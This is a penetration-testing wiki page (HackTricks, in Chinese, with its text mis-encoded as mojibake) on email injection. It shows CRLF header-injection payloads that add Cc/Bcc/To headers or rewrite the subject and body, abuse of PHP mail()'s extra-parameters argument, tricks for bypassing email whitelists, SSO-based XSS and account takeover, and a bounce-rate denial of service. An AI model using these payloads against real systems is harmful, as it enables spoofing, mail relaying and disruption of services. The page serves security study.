# ç”µå­é‚®ä»¶æ³¨å…¥

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) æ¥è½»æ¾æ„å»ºå¹¶**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œç”±ä¸–ç•Œä¸Š**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

å…¶ä»–æ”¯æŒ HackTricks çš„æ–¹å¼ï¼š

* å¦‚æœä½ æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTs é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥**åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

## åœ¨å‘é€çš„ç”µå­é‚®ä»¶ä¸­æ³¨å…¥

### åœ¨å‘ä»¶äººå‚æ•°åæ³¨å…¥ Cc å’Œ Bcc
```
From:sender@domain.com%0ACc:recipient@domain.co,%0ABcc:recipient1@domain.com
```
æ¶ˆæ¯å°†å‘é€è‡³æ”¶ä»¶äººå’Œrecipient1è´¦æˆ·ã€‚

### æ³¨å…¥å‚æ•°
```
From:sender@domain.com%0ATo:attacker@domain.com
```
æ¶ˆæ¯å°†è¢«å‘é€ç»™åŸå§‹æ”¶ä»¶äººå’Œæ”»å‡»è€…è´¦æˆ·ã€‚

### æ³¨å…¥ä¸»é¢˜å‚æ•°
```
From:sender@domain.com%0ASubject:This is%20Fake%20Subject
```
### æ›´æ”¹æ¶ˆæ¯æ­£æ–‡

æ³¨å…¥ä¸¤ä¸ªæ¢è¡Œç¬¦ï¼Œç„¶åç¼–å†™æ‚¨çš„æ¶ˆæ¯ä»¥æ›´æ”¹æ¶ˆæ¯çš„æ­£æ–‡ã€‚
```
From:sender@domain.com%0A%0AMy%20New%20%0Fake%20Message.
```
### PHP mail() å‡½æ•°åˆ©ç”¨
```bash
# The function has the following definition:

php --rf mail

Function [ <internal:standard> function mail ] {
- Parameters [5] {
Parameter #0 [ <required> $to ]
Parameter #1 [ <required> $subject ]
Parameter #2 [ <required> $message ]
Parameter #3 [ <optional> $additional_headers ]
Parameter #4 [ <optional> $additional_parameters ]
}
}
```
#### ç¬¬5ä¸ªå‚æ•°ï¼ˆ$additional\_parametersï¼‰

æœ¬èŠ‚å°†åŸºäº**å¦‚ä½•åœ¨æ”»å‡»è€…æ§åˆ¶æ­¤å‚æ•°çš„æƒ…å†µä¸‹æ»¥ç”¨å®ƒ**ã€‚

æ­¤å‚æ•°å°†è¢«æ·»åŠ åˆ°PHPç”¨æ¥è°ƒç”¨sendmailäºŒè¿›åˆ¶æ–‡ä»¶çš„å‘½ä»¤è¡Œä¸­ã€‚ä½†æ˜¯ï¼Œå®ƒå°†é€šè¿‡å‡½æ•°`escapeshellcmd($additional_parameters)`è¿›è¡Œæ¸…ç†ã€‚

æ”»å‡»è€…å¯ä»¥åœ¨è¿™ç§æƒ…å†µä¸‹**ä¸ºsendmailæ³¨å…¥é¢å¤–çš„å‚æ•°**ã€‚

#### /usr/sbin/sendmailå®ç°çš„å·®å¼‚

**sendmail**æ¥å£æ˜¯ç”±ç³»ç»Ÿä¸Šå®‰è£…çš„MTAç”µå­é‚®ä»¶è½¯ä»¶ï¼ˆSendmailã€Postfixã€Eximç­‰ï¼‰**æä¾›**ã€‚å°½ç®¡**åŸºæœ¬åŠŸèƒ½**ï¼ˆå¦‚-t -i -få‚æ•°ï¼‰å‡ºäºå…¼å®¹æ€§åŸå› ä¿æŒ**ä¸å˜**ï¼Œ**å…¶ä»–åŠŸèƒ½å’Œå‚æ•°**åˆ™æ ¹æ®å®‰è£…çš„MTAæœ‰å¾ˆå¤§å·®å¼‚ã€‚

ä»¥ä¸‹æ˜¯ä¸åŒsendmailå‘½ä»¤/æ¥å£æ‰‹å†Œé¡µçš„ä¸€äº›ç¤ºä¾‹ï¼š

* Sendmail MTA: http://www.sendmail.org/\~ca/email/man/sendmail.html
* Postfix MTA: http://www.postfix.org/mailq.1.html
* Exim MTA: https://linux.die.net/man/8/eximReferences

æ ¹æ®**sendmail**äºŒè¿›åˆ¶æ–‡ä»¶çš„**æ¥æº**ï¼Œå·²ç»å‘ç°äº†ä¸åŒçš„é€‰é¡¹æ¥æ»¥ç”¨å®ƒä»¬å¹¶**æ³„éœ²æ–‡ä»¶ç”šè‡³æ‰§è¡Œä»»æ„å‘½ä»¤**ã€‚æŸ¥çœ‹æ–¹æ³•è¯·è®¿é—®[**https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html**](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)

## åœ¨ç”µå­é‚®ä»¶åç§°ä¸­æ³¨å…¥

### è¢«å¿½ç•¥çš„ç”µå­é‚®ä»¶éƒ¨åˆ†

ç¬¦å·ï¼š**+ã€-** å’Œ **{}** åœ¨æå°‘æ•°æƒ…å†µä¸‹å¯ç”¨äºæ ‡è®°ï¼Œå¹¶è¢«å¤§å¤šæ•°ç”µå­é‚®ä»¶æœåŠ¡å™¨å¿½ç•¥

* ä¾‹å¦‚ï¼šjohn.doe+intigriti@example.com â†’ john.doe@example.com

**æ‹¬å·()ä¸­çš„æ³¨é‡Š**åœ¨å¼€å¤´æˆ–ç»“å°¾ä¹Ÿä¼šè¢«å¿½ç•¥

* ä¾‹å¦‚ï¼šjohn.doe(intigriti)@example.com â†’ john.doe@example.com

### ç™½åå•ç»•è¿‡

<figure><img src="../.gitbook/assets/image (4) (6).png" alt=""><figcaption></figcaption></figure>

### å¼•å·

<figure><img src="../.gitbook/assets/image (6) (4).png" alt=""><figcaption></figcaption></figure>

### IPåœ°å€

æ‚¨ä¹Ÿå¯ä»¥ä½¿ç”¨æ–¹æ‹¬å·ä¸­çš„IPä½œä¸ºåŸŸåï¼š

* john.doe@\[127.0.0.1]
* john.doe@\[IPv6:2001:db8::1]

### å…¶ä»–æ¼æ´

![](<../.gitbook/assets/image (296).png>)

## ç¬¬ä¸‰æ–¹SSO

### XSS

ä¸€äº›æœåŠ¡ï¼Œå¦‚**github**æˆ–**salesforceå…è®¸**æ‚¨åˆ›å»ºåŒ…å«XSSæœ‰æ•ˆè½½è·çš„**ç”µå­é‚®ä»¶åœ°å€**ã€‚å¦‚æœæ‚¨å¯ä»¥**ä½¿ç”¨è¿™äº›æä¾›å•†ç™»å½•å…¶ä»–æœåŠ¡**ï¼Œå¹¶ä¸”è¿™äº›æœåŠ¡**æ²¡æœ‰æ­£ç¡®æ¸…ç†**ç”µå­é‚®ä»¶ï¼Œæ‚¨å¯èƒ½ä¼šå¯¼è‡´**XSS**ã€‚

### è´¦æˆ·æ¥ç®¡

å¦‚æœä¸€ä¸ª**SSOæœåŠ¡**å…è®¸æ‚¨**åœ¨ä¸éªŒè¯ç»™å®šç”µå­é‚®ä»¶åœ°å€**çš„æƒ…å†µä¸‹åˆ›å»ºè´¦æˆ·ï¼ˆå¦‚**salesforce**ï¼‰ï¼Œç„¶åæ‚¨å¯ä»¥ä½¿ç”¨è¯¥è´¦æˆ·**ç™»å½•ä¸åŒçš„æœåŠ¡**ï¼Œè¯¥æœåŠ¡**ä¿¡ä»»**salesforceï¼Œæ‚¨å¯ä»¥è®¿é—®ä»»ä½•è´¦æˆ·ã€‚\
_è¯·æ³¨æ„ï¼Œsalesforceä¼šæŒ‡ç¤ºç»™å®šçš„ç”µå­é‚®ä»¶æ˜¯å¦å·²éªŒè¯ï¼Œå› æ­¤åº”ç”¨ç¨‹åºåº”è€ƒè™‘æ­¤ä¿¡æ¯ã€‚_

## å›å¤è‡³

æ‚¨å¯ä»¥ä½¿ç”¨ _**å‘ä»¶äºº: company.com**_ å’Œ _**å›å¤è‡³: attacker.com**_ å‘é€ç”µå­é‚®ä»¶ï¼Œå¦‚æœç”±äºç”µå­é‚®ä»¶æ˜¯**æ¥è‡ª**ä¸€ä¸ª**å†…éƒ¨åœ°å€**è€Œå‘é€äº†**è‡ªåŠ¨å›å¤**ï¼Œ**æ”»å‡»è€…**å¯èƒ½èƒ½å¤Ÿ**æ¥æ”¶**åˆ°é‚£ä¸ª**å›åº”**ã€‚

## ç¡¬é€€ä¿¡ç‡

ä¸€äº›åº”ç”¨ç¨‹åºï¼Œå¦‚AWSï¼Œæœ‰ä¸€ä¸ª**ç¡¬é€€ä¿¡ç‡**ï¼ˆåœ¨AWSä¸­ä¸º10%ï¼‰ï¼Œä¸€æ—¦è¶…è½½ï¼Œç”µå­é‚®ä»¶æœåŠ¡å°†è¢«é˜»æ­¢ã€‚

**ç¡¬é€€ä¿¡**æ˜¯ç”±äºæŸäº›æ°¸ä¹…åŸå› è€Œæ— æ³•æŠ•é€’çš„**ç”µå­é‚®ä»¶**ã€‚å¯èƒ½æ˜¯**ç”µå­é‚®ä»¶**åœ°å€æ˜¯å‡çš„ï¼Œå¯èƒ½æ˜¯**ç”µå­é‚®ä»¶**åŸŸä¸æ˜¯ä¸€ä¸ªçœŸå®çš„åŸŸï¼Œæˆ–è€…å¯èƒ½æ˜¯**ç”µå­é‚®ä»¶**æ”¶ä»¶äººçš„æœåŠ¡å™¨ä¸æ¥å—**ç”µå­é‚®ä»¶**ï¼‰ï¼Œè¿™æ„å‘³ç€åœ¨1000å°ç”µå­é‚®ä»¶ä¸­ï¼Œå¦‚æœæœ‰100å°æ˜¯å‡çš„æˆ–æ— æ•ˆçš„å¯¼è‡´æ‰€æœ‰é‚®ä»¶é€€å›ï¼Œ**AWS SES**å°†é˜»æ­¢æ‚¨çš„æœåŠ¡ã€‚

å› æ­¤ï¼Œå¦‚æœæ‚¨èƒ½å¤Ÿ**å‘é€é‚®ä»¶ï¼ˆå¯èƒ½æ˜¯é‚€è¯·ï¼‰ä»Webåº”ç”¨ç¨‹åºåˆ°ä»»ä½•ç”µå­é‚®ä»¶åœ°å€ï¼Œæ‚¨å¯ä»¥é€šè¿‡å‘ä¸å­˜åœ¨çš„ç”¨æˆ·å’ŒåŸŸå‘é€æ•°ç™¾å°é‚€è¯·æ¥å¼•å‘æ­¤é˜»å¡ï¼šç”µå­é‚®ä»¶æœåŠ¡DoSã€‚**

## å‚è€ƒèµ„æ–™

* [https://resources.infosecinstitute.com/email-injection/](https://resources.infosecinstitute.com/email-injection/)
* [https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)
* [https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view](https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view)
* [https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0](https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0)

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹ AWSé»‘å®¢æ”»å‡»ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm_campaign=hacktrics\&utm_medium=banner\&utm_source=hacktricks) è½»æ¾æ„å»ºå¹¶**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œç”±ä¸–ç•Œä¸Š**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
